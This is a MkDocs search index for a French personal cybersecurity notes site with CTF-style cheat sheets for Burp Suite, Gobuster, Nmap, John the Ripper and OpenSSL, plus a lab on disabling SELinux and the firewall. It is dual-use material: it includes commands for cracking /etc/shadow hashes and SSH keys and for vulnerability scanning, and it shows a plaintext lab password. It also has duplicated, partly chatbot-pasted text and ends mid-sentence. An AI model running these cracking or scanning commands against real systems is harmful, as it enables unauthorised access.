{"config":{"lang":["fr"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"\ud83d\udee1\ufe0f Bienvenue dans mon Labo \ud83d\udee1\ufe0f","text":"<p> Exploration | Documentation | Cybers\u00e9curit\u00e9 </p> <p> Salut !   Je regroupe ici toute ma documentation, mes \"Write-ups\" et mes notes techniques.   Si tu souhaites d\u00e9couvrir l'informatique et plonger dans le monde du Hacking \u00c9thique avec moi, tu es au bon endroit ! </p> <p></p>"},{"location":"#mes-outils","title":"Mes Outils","text":""},{"location":"#mes-reseaux-plateformes","title":"Mes R\u00e9seaux &amp; Plateformes","text":"<p>Clique sur les ic\u00f4nes pour voir mes profils et suivre ma progression !</p>"},{"location":"Tools/burpsuite/","title":"Burp Suite","text":"<p>C'est quoi ?</p> <p>Burp Suite est une plateforme int\u00e9gr\u00e9e d'outils pour effectuer des tests de s\u00e9curit\u00e9 d'applications web. C'est l'outil de r\u00e9f\u00e9rence dans le domaine de l'audit de s\u00e9curit\u00e9 des applications HTTP.</p>"},{"location":"Tools/burpsuite/#composants-cles-de-burp-suite","title":"Composants Cl\u00e9s de Burp Suite","text":"<p>Burp Suite est un ensemble d'outils interconnect\u00e9s. Les trois composants que vous utiliserez le plus sont le Proxy, le Repeater et l'Intruder.</p> <ol> <li>Proxy (Le C\u0153ur de Burp)</li> </ol> <p>Le Proxy est le composant fondamental de Burp. Il agit comme un interm\u00e9diaire entre votre navigateur web et le serveur de l'application cible.</p> <pre><code>Fonctionnement : Il intercepte toutes les requ\u00eates (envois) et r\u00e9ponses (r\u00e9ceptions) HTTP/S, vous permettant de les visualiser, modifier et manipuler avant qu'elles n'atteignent leur destination.\n\nUtilisation : Pour commencer, vous devez configurer votre navigateur pour qu'il utilise le Proxy de Burp (par d\u00e9faut, 127.0.0.1:8080).\n</code></pre> <p>J'utilise FoxyProxy une extension de firefox permettant de configurer un proxy : </p> <p>Voici ma config :</p> <p></p> Fonction Description Intercept Activation/D\u00e9sactivation de l'interception des requ\u00eates/r\u00e9ponses. History Journal de toutes les requ\u00eates et r\u00e9ponses qui sont pass\u00e9es par le proxy, m\u00eame si elles n'ont pas \u00e9t\u00e9 intercept\u00e9es. <ol> <li>Repeater (R\u00e9p\u00e9titeur)</li> </ol> <p>Le Repeater est con\u00e7u pour la modification manuelle et r\u00e9p\u00e9titive d'une seule requ\u00eate HTTP.</p> <pre><code>Fonctionnement : Vous envoyez une requ\u00eate du Proxy (ou de l'Historique) vers le Repeater, vous la modifiez (param\u00e8tres, en-t\u00eates, etc.), et vous la renvoyez au serveur autant de fois que n\u00e9cessaire.\n\nUtilisation : Id\u00e9al pour tester l'impact d'une seule modification :\n\n    V\u00e9rification des injections SQL (SQLi) ou des scripts intersites (XSS).\n\n    Test de vuln\u00e9rabilit\u00e9s d'autorisation ou de contournement de filtre.\n</code></pre> <ol> <li>Intruder (Intrus)</li> </ol> <p>L'Intruder est un outil puissant pour automatiser des attaques r\u00e9p\u00e9titives et personnalisables. Il prend une requ\u00eate de base et la r\u00e9p\u00e8te avec des listes de charges utiles (payloads) ins\u00e9r\u00e9es \u00e0 des points sp\u00e9cifiques.</p> <pre><code>Fonctionnement : Il permet de tester des milliers de combinaisons en tr\u00e8s peu de temps.\n\nUtilisation : Pour les attaques par force brute ou les tests d'injection syst\u00e9matiques.\n</code></pre> Type d'attaque Description Cas d'usage typique Sniper Une seule liste de charges utiles, ins\u00e9r\u00e9es dans un seul emplacement. Test de XSS avec 100 payloads diff\u00e9rents. Battering Ram Une seule liste de charges utiles, ins\u00e9r\u00e9e simultan\u00e9ment dans tous les emplacements marqu\u00e9s. Attaque par dictionnaire sur un seul champ. Pitchfork Plusieurs listes de charges utiles (une par emplacement), avec une it\u00e9ration parall\u00e8le. Nom d'utilisateur A avec mot de passe A, B avec B, etc. Cluster Bomb Plusieurs listes de charges utiles, avec une it\u00e9ration exhaustive de toutes les combinaisons. Attaque par force brute Nom d'utilisateur/Mot de passe. --- <p>Absolument ! Voici un cours structur\u00e9 sur Burp Suite, un outil essentiel pour les tests d'intrusion et la s\u00e9curit\u00e9 des applications web, r\u00e9dig\u00e9 en Markdown.</p> <p>Introduction \u00e0 Burp Suite</p> <p>Burp Suite est une plateforme int\u00e9gr\u00e9e d'outils pour effectuer des tests de s\u00e9curit\u00e9 d'applications web. C'est l'outil de r\u00e9f\u00e9rence dans le domaine de l'audit de s\u00e9curit\u00e9 des applications HTTP.</p> <p>Deux \u00e9ditions principales</p> <p>\u00c9dition Description Public cible Community Edition (Gratuite)    Fonctionnalit\u00e9s de base, y compris le Proxy, l'Intruder limit\u00e9, et Repeater.    D\u00e9butants, \u00e9tudiants, et usages simples. Professional Edition (Payante)  Toutes les fonctionnalit\u00e9s, y compris le scanner automatis\u00e9, Intruder illimit\u00e9, et de nombreux modules avanc\u00e9s. Professionnels de la s\u00e9curit\u00e9 (p\u00e9n\u00e9trateurs), \u00e9quipes de d\u00e9veloppement s\u00e9curis\u00e9.</p> <p>Composants Cl\u00e9s de Burp Suite</p> <p>Burp Suite est un ensemble d'outils interconnect\u00e9s. Les trois composants que vous utiliserez le plus sont le Proxy, le Repeater et l'Intruder.</p> <ol> <li>Proxy (Le C\u0153ur de Burp)</li> </ol> <p>Le Proxy est le composant fondamental de Burp. Il agit comme un interm\u00e9diaire entre votre navigateur web et le serveur de l'application cible.</p> <pre><code>Fonctionnement : Il intercepte toutes les requ\u00eates (envois) et r\u00e9ponses (r\u00e9ceptions) HTTP/S, vous permettant de les visualiser, modifier et manipuler avant qu'elles n'atteignent leur destination.\n\nUtilisation : Pour commencer, vous devez configurer votre navigateur pour qu'il utilise le Proxy de Burp (par d\u00e9faut, 127.0.0.1:8080).\n</code></pre> <p>Fonction    Description Intercept   Activation/D\u00e9sactivation de l'interception des requ\u00eates/r\u00e9ponses. History Journal de toutes les requ\u00eates et r\u00e9ponses qui sont pass\u00e9es par le proxy, m\u00eame si elles n'ont pas \u00e9t\u00e9 intercept\u00e9es.</p> <ol> <li>Repeater (R\u00e9p\u00e9titeur)</li> </ol> <p>Le Repeater est con\u00e7u pour la modification manuelle et r\u00e9p\u00e9titive d'une seule requ\u00eate HTTP.</p> <pre><code>Fonctionnement : Vous envoyez une requ\u00eate du Proxy (ou de l'Historique) vers le Repeater, vous la modifiez (param\u00e8tres, en-t\u00eates, etc.), et vous la renvoyez au serveur autant de fois que n\u00e9cessaire.\n\nUtilisation : Id\u00e9al pour tester l'impact d'une seule modification :\n\n    V\u00e9rification des injections SQL (SQLi) ou des scripts intersites (XSS).\n\n    Test de vuln\u00e9rabilit\u00e9s d'autorisation ou de contournement de filtre.\n</code></pre> <ol> <li>Intruder (Intrus)</li> </ol> <p>L'Intruder est un outil puissant pour automatiser des attaques r\u00e9p\u00e9titives et personnalisables. Il prend une requ\u00eate de base et la r\u00e9p\u00e8te avec des listes de charges utiles (payloads) ins\u00e9r\u00e9es \u00e0 des points sp\u00e9cifiques.</p> <pre><code>Fonctionnement : Il permet de tester des milliers de combinaisons en tr\u00e8s peu de temps.\n\nUtilisation : Pour les attaques par force brute ou les tests d'injection syst\u00e9matiques.\n</code></pre> <p>Type d'attaque  Description Cas d'usage typique Sniper  Une seule liste de charges utiles, ins\u00e9r\u00e9es dans un seul emplacement.   Test de XSS avec 100 payloads diff\u00e9rents. Battering Ram   Une seule liste de charges utiles, ins\u00e9r\u00e9e simultan\u00e9ment dans tous les emplacements marqu\u00e9s.    Attaque par dictionnaire sur un seul champ. Pitchfork   Plusieurs listes de charges utiles (une par emplacement), avec une it\u00e9ration parall\u00e8le. Nom d'utilisateur A avec mot de passe A, B avec B, etc. Cluster Bomb    Plusieurs listes de charges utiles, avec une it\u00e9ration exhaustive de toutes les combinaisons.   Attaque par force brute Nom d'utilisateur/Mot de passe.</p> <ol> <li> <p>Scanner &amp; Target (Professionnel)</p> <p>Scanner : Automatise la recherche de vuln\u00e9rabilit\u00e9s. Il rampe sur l'application et lance des tests d'injection pour identifier des failles courantes.</p> <p>Target (Cible) : Fournit une vue d'ensemble hi\u00e9rarchique du contenu de l'application et de toutes les requ\u00eates et r\u00e9ponses associ\u00e9es. Il permet de d\u00e9finir la port\u00e9e (scope) de votre test.</p> </li> </ol>"},{"location":"Tools/commande-linux/","title":"Liste de commande linux :","text":"ls afficher les fichier du dossier o\u00f9 on se trouve cd changer de directory pwd afficher le r\u00e9pertoire de travail alias permet de raccourcir des commandes cp filetocopy  newfile permet de copier le fichier dans un autre rm supprimer mv source_file  dest_file d\u00e9placer un fichier ou renommer le fichier mkdir cr\u00e9e un dossier touch cr\u00e9e un fichier man consulter le manuel chmod donner des droits ./ exec un fichier sudo droit admin nano editer un fichier unzip unzip un dossier cat lire un fichier passwd changer les mdp which chemin complet  (which python) less inspecter les fichiers en avant et en arri\u00e8re tail affiche les 10 dernieres lignes head affiche les 10 premi\u00e8res lignes grep chercher du texte (grep \"coucou\" ) avec des flags (-c compter le nombre d'occurences) whoami affiche le nom d'user whatis affiche un description neofetch affiche les info du syst\u00e8me wget recup du contenu sur internet"},{"location":"Tools/gobuster/","title":"Gobuster (Directory Bruteforcer)","text":"<p>Qu'est-ce que Gobuster ?</p> <p>Gobuster est un outil de force brute \u00e9crit en Go. Il est con\u00e7u pour \u00eatre rapide et efficace, et est utilis\u00e9 pour \u00e9num\u00e9rer :</p> <ul> <li>Les r\u00e9pertoires et fichiers cach\u00e9s d'un serveur web.</li> <li>Les sous-domaines \u00e0 partir d'une liste (wordlist).</li> <li>Les Virtual Hosts sur un serveur.</li> </ul>"},{"location":"Tools/gobuster/#1-la-commande-royale-ctf","title":"1. La Commande \"Royale\" (CTF)","text":"<p>Si tu cherches des chemins cach\u00e9s sur un site, c'est la commande standard \u00e0 retenir : <pre><code>gobuster dir -u [http://cible.thm](http://cible.thm) -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,txt,html\n</code></pre></p> Option Description <code>dir</code> Sp\u00e9cifie le mode de fonctionnement de Gobuster : la recherche de r\u00e9pertoires et de fichiers sur la cible. <code>-u</code> D\u00e9finit l'URL de la cible (le site web) \u00e0 scanner. <code>-w</code> Indique le chemin vers la wordlist (liste de mots) contenant les noms de r\u00e9pertoires/fichiers \u00e0 tester. <code>-t</code> Fixe le nombre de threads concurrents \u00e0 utiliser, influen\u00e7ant la vitesse du scan. <code>-x</code> Ajoute des extensions de fichiers sp\u00e9cifiques (par exemple, <code>.php</code>, <code>.html</code>, <code>.bak</code>) \u00e0 essayer pour chaque entr\u00e9e de la wordlist."},{"location":"Tools/gobuster/#2-les-modes-de-scan-types-dattaque","title":"2. Les Modes de Scan (Types d'attaque)","text":"<p>Gobuster fonctionne selon plusieurs modes, que tu d\u00e9finis imm\u00e9diatement apr\u00e8s gobuster :</p> Mode Nom Description dir Directory/File Mode standard. Recherche les r\u00e9pertoires et fichiers cach\u00e9s. dns DNS Subdomains Force brute pour trouver des sous-domaines (ex: <code>https://www.google.com/search?q=dev.cible.com</code>). vhost Virtual Hosts Recherche des noms de serveurs virtuels (utile sur des serveurs partag\u00e9s)."},{"location":"Tools/gobuster/#3-options-de-filtrage-et-de-performance","title":"3. Options de Filtrage et de Performance","text":"Option Nom Description -w Wordlist Le fichier contenant la liste de mots \u00e0 tester. -t Threads Augmente la vitesse du scan (attention \u00e0 ne pas saturer la cible !). -x Extensions Ajoute une liste d'extensions \u00e0 tester (ex: <code>.php</code>, <code>.bak</code>, <code>.zip</code>). -k Insecure Ignorer les erreurs de certificats SSL (pour les sites en HTTPS). <p>Codes de Statut \u00e0 surveiller</p> <ul> <li>200 (OK) : Fichier ou r\u00e9pertoire trouv\u00e9.</li> <li>301 / 302 (Redirection) : Chemin trouv\u00e9, mais redirige ailleurs.</li> <li>403 (Forbidden) : Chemin trouv\u00e9, mais l'acc\u00e8s est interdit (souvent int\u00e9ressant !).</li> <li>404 (Not Found) : Non trouv\u00e9 (comportement normal).</li> </ul>"},{"location":"Tools/gobuster/#4-cheat-sheet-recapitulatif","title":"4. Cheat Sheet R\u00e9capitulatif","text":"Cat\u00e9gorie Commande Description Mode <code>dir</code> Lance le scan de chemins (directories/files). <code>vhost</code> Lance le scan de serveurs virtuels (Virtual Hosts). <code>dns</code> Lance le scan de sous-domaines (DNS Subdomains). Ciblage <code>-u</code> URL de la cible. <code>-w</code> Indique le chemin de la wordlist. <code>-x</code> Liste des extensions \u00e0 tester (ex: <code>php</code>, <code>bak</code>). Performance <code>-t</code> Nombre de threads. <code>-r</code> Suivre les redirections (Follow redirects). Filtrage <code>-s</code> Afficher uniquement les codes de statut sp\u00e9cifi\u00e9s (ex: <code>200</code>, <code>301</code>). <code>-b</code> Masquer les codes de statut sp\u00e9cifiques (ex: <code>404</code>). <code>-k</code> Ignorer les certificats SSL non valides (Insecure)."},{"location":"Tools/johntheripper/","title":"John the Ripper","text":"<p>C'est quoi ?</p> <p>John the Ripper (JtR) est l'un des outils de cassage de mots de passe les plus c\u00e9l\u00e8bres. Il fonctionne hors ligne (offline), c'est-\u00e0-dire qu'il tente de trouver le mot de passe correspondant \u00e0 une empreinte chiffr\u00e9e (hash) que vous avez r\u00e9cup\u00e9r\u00e9e.</p> <p>Attention</p> <p>L'utilisation de cet outil est strictement r\u00e9serv\u00e9e aux environnements de test (CTF, Pentest autoris\u00e9).</p>"},{"location":"Tools/johntheripper/#1-lattaque-par-dictionnaire-wordlist","title":"1. L'Attaque par Dictionnaire (Wordlist)","text":"<p>C'est la m\u00e9thode la plus utilis\u00e9e en CTF. On fournit une liste de mots probables (comme <code>rockyou.txt</code>) et John teste chaque mot.</p>"},{"location":"Tools/johntheripper/#prerequis-la-wordlist-rockyou","title":"Pr\u00e9requis : La Wordlist Rockyou","text":"<p>Sur Kali Linux, si c'est la premi\u00e8re fois, d\u00e9compressez la liste : <pre><code>sudo gzip -d /usr/share/wordlists/rockyou.txt.gz\n</code></pre></p>"},{"location":"Tools/johntheripper/#la-commande-de-base","title":"La commande de base","text":"<pre><code># Syntaxe : john --wordlist=[CheminWordlist] [FichierHash]\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n</code></pre>"},{"location":"Tools/johntheripper/#2-identifier-et-forcer-un-format","title":"2. Identifier et Forcer un Format","text":"<p>Par d\u00e9faut, John essaie de deviner le type de hash (MD5, SHA1...). Parfois, il se trompe ou vous demande d'\u00eatre plus pr\u00e9cis.</p> <p>Lister les formats disponibles</p> <pre><code>john --list=formats\n</code></pre> <p>Forcer un format sp\u00e9cifique</p> <p>Si vous savez que c'est du MD5 brut : <pre><code>john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n</code></pre></p>"},{"location":"Tools/johntheripper/#3-craquer-des-mots-de-passe-linux-etcshadow","title":"3. Craquer des mots de passe Linux (/etc/shadow)","text":"<p>Sur Linux, pour cracker un compte utilisateur, il faut combiner le fichier /etc/passwd et /etc/shadow. John poss\u00e8de un outil pour \u00e7a : unshadow.</p> <p>Proc\u00e9dure :</p> <pre><code>Fusionner les fichiers :\n</code></pre> <p><code>Bash  unshadow passwd.txt shadow.txt &gt; unshadowed.txt</code></p> <p>Lancer l'attaque :</p> <pre><code>    john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt\n</code></pre>"},{"location":"Tools/johntheripper/#4-voir-les-mots-de-passe-trouves","title":"4. Voir les mots de passe trouv\u00e9s","text":"<p>Une fois un mot de passe trouv\u00e9, John ne le r\u00e9affiche pas si vous relancez la commande (il le sauvegarde dans ~/.john/john.pot).</p> <p>Pour afficher ce qui a d\u00e9j\u00e0 \u00e9t\u00e9 craqu\u00e9 : <pre><code>john --show hash.txt\n</code></pre></p>"},{"location":"Tools/johntheripper/#5-utilitaires-de-conversion-les-2john","title":"5. Utilitaires de conversion (Les \"*2john\")","text":"<p>Souvent en CTF, vous r\u00e9cup\u00e9rez un fichier ZIP prot\u00e9g\u00e9 ou une cl\u00e9 SSH, pas un simple hash. Il faut les convertir dans un format que John comprend. <pre><code>Fichier source  Outil de conversion Commande\nFichier ZIP zip2john    zip2john protected.zip &gt; hash.txt\nCl\u00e9 SSH (id_rsa)    ssh2john    ssh2john id_rsa &gt; hash.txt\nFichier RAR rar2john    rar2john archive.rar &gt; hash.txt\nFichier Keepass keepass2john    keepass2john database.kdbx &gt; hash.txt\n</code></pre></p>"},{"location":"Tools/nmap/","title":"Nmap (Network Mapper)","text":"<p>C'est quoi Nmap ?</p> <p>Nmap est l'outil indispensable du pentester. Il permet de scanner un r\u00e9seau pour d\u00e9couvrir :</p> <ul> <li>Les machines actives.</li> <li>Les ports ouverts.</li> <li>Les services qui tournent dessus (et leur version).</li> <li>Le syst\u00e8me d'exploitation de la cible.</li> </ul>"},{"location":"Tools/nmap/#1-la-commande-royale-ctf","title":"1. La Commande \"Royale\" (CTF)","text":"<p>Si tu ne dois retenir qu'une seule commande pour tes challenges Root-Me ou TryHackMe, c'est celle-ci :</p> <pre><code>sudo nmap -sS -sC -sV -p- -T4 -oA scan_result &lt;IP_CIBLE&gt;\n</code></pre> <p>D\u00e9corticage de la commande :</p> <pre><code>sudo : N\u00e9cessaire pour le scan SYN (-sS) et la d\u00e9tection d'OS.\n\n-sS : SYN Scan. Rapide et discret (ne termine pas la connexion TCP).\n\n-sC : Scripts par d\u00e9faut. Lance des scripts basiques (titre HTML, cl\u00e9s SSH...).\n\n-sV : Version. Affiche la version pr\u00e9cise des services (ex: Apache 2.4.1).\n\n-p- : Tout. Scanne les 65535 ports (pas juste les 1000 premiers).\n\n-T4 : Vitesse. Mode \"Agressif\" pour gagner du temps.\n\n-oA : Output All. Sauvegarde les r\u00e9sultats dans 3 formats diff\u00e9rents.\n</code></pre>"},{"location":"Tools/nmap/#2les-types-de-scans","title":"2.Les Types de Scans","text":"Flag Nom Description <code>-sS</code> SYN Scan (Stealth) Le scan par d\u00e9faut en root. Rapide, il n'\u00e9tablit pas la connexion compl\u00e8te. <code>-sT</code> Connect Scan Utilis\u00e9 si on n'a pas les droits root. Plus lent et plus visible dans les logs. <code>-sU</code> UDP Scan Scanne les ports UDP (DNS, SNMP...). Tr\u00e8s lent mais crucial pour un audit complet. <p>!!! warning \"Attention au scan UDP\" Scanner tous les ports UDP (-sU -p-) peut prendre des heures. Pr\u00e9f\u00e9rez scanner les ports connus : nmap -sU --top-ports 100"},{"location":"Tools/nmap/#3-decouverte-de-services-os","title":"3. D\u00e9couverte de Services &amp; OS","text":"<p>Savoir qu'un port est ouvert (Open), c'est bien. Savoir ce qui tourne derri\u00e8re, c'est mieux.</p> <pre><code>-sV (Version Detection) : Interroge le service pour r\u00e9cup\u00e9rer sa banni\u00e8re.\n\n-O (OS Detection) : Analyse les paquets IP pour deviner l'OS (Windows, Linux, Android...).\n\n-A (Aggressive) : Le \"Tout-en-un\". Active la d\u00e9tection d'OS (-O), de version (-sV), les scripts (-sC) et le traceroute.\n</code></pre>"},{"location":"Tools/nmap/#4-gestion-des-ports","title":"4. Gestion des Ports","text":"<p>Par d\u00e9faut, Nmap ne scanne que les 1000 ports les plus fr\u00e9quents. En CTF, les admins cachent souvent des services sur des ports \u00e9lev\u00e9s (ex: 8080, 2222, 31337). | Commande | Action | | :--- | :--- | | <code>-p 80</code> | Scanne uniquement le port 80. | | <code>-p 21,22,80</code> | Scanne une liste pr\u00e9cise. | | <code>-p-</code> | Scanne TOUS les ports (1 \u00e0 65535). Recommand\u00e9. | | <code>-p 1-1000</code> | Scanne une plage d\u00e9finie. | | <code>-F</code> | Fast Mode. Scanne les 100 ports les plus courants. |</p>"},{"location":"Tools/nmap/#5-contourner-le-pare-feu-firewall","title":"5. Contourner le Pare-feu (Firewall)","text":"<p>Souvent, la machine cible est configur\u00e9e pour ignorer le \"Ping\". Nmap croit alors qu'elle est \u00e9teinte et arr\u00eate le scan.</p> <p>!!! tip \"L'option indispensable : -Pn\" Utilisez toujours -Pn (No Ping) pour forcer Nmap \u00e0 scanner la cible, m\u00eame si elle ne r\u00e9pond pas au ping.</p> <pre><code>nmap -Pn &lt;IP_CIBLE&gt;\n</code></pre>"},{"location":"Tools/nmap/#6-nmap-scripting-engine-nse","title":"6. Nmap Scripting Engine (NSE)","text":"<p>Nmap peut utiliser des scripts (en Lua) pour automatiser des attaques ou de la reconnaissance.</p> <pre><code>-sC : Lance les scripts par d\u00e9faut (s\u00fbrs).\n\n--script=vuln : Lance les scripts de d\u00e9tection de vuln\u00e9rabilit\u00e9s (CVE). Attention : peut \u00eatre instable.\n\n--script=http-enum : Enum\u00e9ration de dossiers web (comme Gobuster, mais moins complet).\n</code></pre> <p>Exemple pour scanner les vuln\u00e9rabilit\u00e9s SMB :</p> <pre><code>nmap -p 445 --script=smb-vuln* &lt;IP&gt;\n</code></pre>"},{"location":"Tools/nmap/#7sauvegarde-output","title":"7.Sauvegarde (Output)","text":"<p>Ne perdez jamais vos r\u00e9sultats !</p> <pre><code>-oN scan.txt : Format \"Normal\" (texte lisible).\n\n-oX scan.xml : Format XML (pour importer dans Metasploit ou Searchsploit).\n\n-oA nom_scan : Output All. Cr\u00e9e les 3 formats d'un coup. C'est la meilleure pratique.\n</code></pre>"},{"location":"Tools/nmap/#8cheat-sheet-recapitulatif","title":"8.Cheat Sheet R\u00e9capitulatif","text":"Cat\u00e9gorie Commande Description Ports <code>-p-</code> Scanne tous les 65535 ports. <code>-F</code> Scan rapide (Top 100 ports). Technique <code>-sS</code> Scan SYN (Rapide, root requis). <code>-sU</code> Scan UDP (Lent). Infos <code>-sV</code> Versions des services. <code>-O</code> D\u00e9tection de l'OS. <code>-A</code> Mode Agressif (OS + Version + Script). Options <code>-Pn</code> Ne pas Pinger (Force le scan). <code>-T4</code> Vitesse rapide. <code>-v</code> Verbose (Affiche les d\u00e9tails en direct). <code>-oA</code> Sauvegarde tout."},{"location":"Tools/openssl/","title":"OpenSSL","text":"<p>C'est quoi OPENSSL ?</p> <p>OpenSSL  est une bo\u00eete \u00e0 outils de cryptographie qui impl\u00e9mente les protocoles SSL (Secure Sockets Layer) et TLS (Transport Layer Security). Elle permet d'effectuer des t\u00e2ches li\u00e9es \u00e0 la s\u00e9curit\u00e9 comme la cr\u00e9ation de certificats num\u00e9riques, la gestion de cl\u00e9s priv\u00e9es, le chiffrement et le d\u00e9-chiffrement de donn\u00e9es, et les tests de connexions s\u00e9curis\u00e9e</p> Utilitaires OpenSSL Description Exemples d'Extensions de Fichiers <code>genrsa</code> G\u00e9n\u00e8re une cl\u00e9 priv\u00e9e RSA. C'est souvent la premi\u00e8re \u00e9tape. <code>.key</code>, <code>.pem</code> <code>req</code> Cr\u00e9e une demande de signature de certificat (CSR) et peut g\u00e9n\u00e9rer des certificats auto-sign\u00e9s. <code>.csr</code>, <code>.pem</code> <code>x509</code> G\u00e8re les certificats X.509 (les certificats SSL/TLS). Permet de visualiser, convertir, ou modifier un certificat. <code>.crt</code>, <code>.cer</code>, <code>.pem</code>, <code>.der</code> <code>rsa</code> G\u00e8re les cl\u00e9s RSA : permet de visualiser une cl\u00e9 ou de la d\u00e9chiffrer. <code>.key</code>, <code>.pem</code> <code>pkcs12</code> Permet de manipuler des fichiers PKCS#12 (ou <code>.pfx</code>/<code>.p12</code>), qui stockent une cl\u00e9 priv\u00e9e et son certificat dans un seul fichier prot\u00e9g\u00e9 par mot de passe. <code>.pfx</code>, <code>.p12</code> <code>s_client</code> Agit comme un client SSL/TLS pour tester une connexion \u00e0 un serveur distant et inspecter sa cha\u00eene de certificats. N/A <code>ciphers</code> Liste les suites de chiffrement support\u00e9es par OpenSSL. N/A <code>dgst</code> Calcule des hachages (digests) de fichiers en utilisant divers algorithmes (ex: SHA256). N/A"},{"location":"Tools/openssl/#commandes-cles","title":"Commandes cl\u00e9s :","text":"T\u00e2che Commande OpenSSL G\u00e9n\u00e9rer une Cl\u00e9 Priv\u00e9e RSA (2048 bits) <code>openssl genrsa -out ma_cle_privee.key 2048</code> Cr\u00e9er une Demande de Signature de Certificat (CSR) <code>openssl req -new -key ma_cle_privee.key -out ma_demande.csr</code> Auto-signer un Certificat (pour le d\u00e9veloppement) <code>openssl req -x509 -days 365 -key ma_cle_privee.key -in ma_demande.csr -out mon_certificat.crt</code> V\u00e9rifier le Contenu d'un Certificat <code>openssl x509 -in mon_certificat.crt -text -noout</code> Tester la Connexion SSL d'un Site Web <code>openssl s_client -connect google.com:443</code>"},{"location":"Tools/openssl/#exemple","title":"Exemple :","text":"<p>On va chiffrer un msg dans msg.txt :  </p> <p></p> <p>On va executer la commande : <code>openssl enc -e -aes-128-cbc -in msg.txt -out msgENCRYPT</code> </p> <ul> <li> <p>enc : methode openssl permetannt de chiffrer / dechiffrer</p> </li> <li> <p>-e : singification \"encrypt\"</p> </li> <li> <p>-aes-128-cbc : Algorithme de chiffrement ( ca pourrait en \u00eatre un autre).</p> </li> <li> <p>-in msg.txt : fichier \u00e0 chiffrer </p> </li> <li> <p>-out msgENCRYPT : le fichier pr\u00e9cedent en chfifrer.</p> </li> </ul> <p></p> <p>On a donc le nouveau fichier msgENCRYPT on va l'afficher pour montrer qu'il est chiffr\u00e9 : </p> <p></p> <p>Maintenant on va d\u00e9chiffrer pour retrouver le message pr\u00e9cedent</p> <p>Commande : <code>openssl enc -d -aes-128-cbc -in msgENCRYPT -out msgDECRYPT</code></p> <ul> <li> <p>enc : methode openssl permetannt de chiffrer / dechiffrer</p> </li> <li> <p>-d : singification \"decrypt\"</p> </li> <li> <p>-aes-128-cbc : Algorithme de chiffrement ( ca pourrait en \u00eatre un autre).</p> </li> <li> <p>-in msgENCRYPT : fichier \u00e0 dechiffrer</p> </li> <li> <p>-out msgDECRYPT : le fichier d\u00e9chiffrer. </p> </li> </ul> <p></p> <p>Et voil\u00e0 maintenant on peut chiffrer un fichier avec un algorithme de chiffrement simple \"aes128\". </p>"},{"location":"Tools/openssl/#a-continuer","title":"A CONTINUER","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/","title":"Info :","text":"<pre><code>-Login : user\n-mdp : User@dmin!\n</code></pre> <p>http://localhost:8181/ = campagne</p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#2-desactivation-de-selinux","title":"2 - D\u00e9sactivation de SELinux","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#a-a-quoi-sert-ce-composant","title":"a) A quoi sert ce composant\u00a0?","text":"<p>SELinux est un module de s\u00e9curit\u00e9 du noyau qui applique un contr\u00f4le d'acc\u00e8s obligatoire. C'est une couche de protection suppl\u00e9mentaire contre les attaques et erreur de configuration.</p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#b-comment-peut-on-le-desactiver-momentanement","title":"b) Comment peut-on le d\u00e9sactiver momentan\u00e9ment ?","text":"<p>1) La premi\u00e8re fa\u00e7on est :  <pre><code>setenforce 0\n</code></pre> Cela permet de mettre SELinux en mode permissif (log mais ne bloque plus). 2) La seconde fa\u00e7on est de modifier la variable de boot du noyau, cela va d\u00e9sactiver SELinux pour le d\u00e9marrage suivant uniquement. <pre><code>selinux=0\n</code></pre></p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#c-comment-peut-on-le-desactiver-de-facon-permanente","title":"c) Comment peut-on le d\u00e9sactiver de fa\u00e7on permanente ?","text":"<p>Pour le modifier de fa\u00e7on permanente, il faut : </p> <pre><code>sudo vi /etc/selinux/confi\n</code></pre> <p>Et remplacer la ligne <code>SELINUX=enforcing</code> Par :  <code>SELINUX=disabled</code></p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#3-desactivation-momentane-du-pare-feu","title":"3- D\u00e9sactivation momentan\u00e9 du pare-feu.","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#a-quelle-commande-vous-permet-de-desactiver-temporairement-le-firewall-le-temps-de-proceder-a-la-configuration-de-la-machine","title":"a) Quelle commande vous permet de d\u00e9sactiver temporairement le firewall, le temps de proc\u00e9der a la configuration de la machine ?","text":"<p>Pour d\u00e9sactiver temporairement le firewall :  <pre><code>sudo systemctl stop firewalld\n</code></pre></p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#b-quelle-commande-vous-permet-davoir-la-certitude-que-le-firewall-est-bien-inactif","title":"b) Quelle commande vous permet d\u2019avoir la certitude que le firewall est bien inactif ?","text":"<p>Pour v\u00e9rifier si le firewall est stop :  <pre><code>sudo firewall-cmd --state\n</code></pre></p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#4-installation-du-service-apache-la-configuration-reseau-avance-viendra-par-la-suite","title":"4-Installation du service Apache (La configuration r\u00e9seau avanc\u00e9 viendra par la suite)","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#a-quels-sont-les-trois-principaux-serveurs-web-disponible-sous-linux","title":"a) Quels sont les trois principaux serveurs WEB disponible sous Linux","text":"<p>Les trois principaux sont :      -Apache     -Nginx     -Lighttpd</p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#bla-commande-dnf-ou-anciennement-yum-permet-dinstaller-les-packages","title":"b)La commande dnf (ou anciennement yum) permet d\u2019installer les packages.","text":"<p>Quelle commande permet de retrouver le nom du package contenant le serveur Apache ?     - La commande est : <code>dnf search apache</code> Quelle commande permet d\u2019installer le serveur Apache ?     - <code>sudo dnf install httpd</code></p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#c-demarrage-du-service-apache","title":"c) D\u00e9marrage du service Apache","text":"<p>La commande permettant de d\u00e9marrer le service Apache est : <pre><code>sudo systemctl start httpd\n</code></pre></p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#d-quelle-commande-vous-permet-davoir-la-certitude-que-le-service-apache-est-fonctionnel","title":"d) Quelle commande vous permet d\u2019avoir la certitude que le service 